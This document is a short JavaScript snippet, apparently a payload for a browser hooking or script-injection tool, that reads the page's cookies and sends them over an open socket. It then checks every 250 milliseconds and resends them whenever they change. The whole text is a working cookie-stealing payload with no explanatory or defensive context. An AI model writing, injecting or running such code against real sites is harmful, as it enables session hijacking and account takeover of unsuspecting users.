if(!window.$_$cs){
	var $_$cookies = document.cookie,
		$_$cookieInt = null,
		$_$self = this;

	this.send($_$cookies);
	window.$_$cs = true;
	$_$cookieInt = setInterval(function(){
		if(document.cookie !== $_$cookies){
			$_$cookies = document.cookie;
			$_$self.send($_$cookies);
		}
	}, 250);	
}else{
	this.send('already running on this socket');
}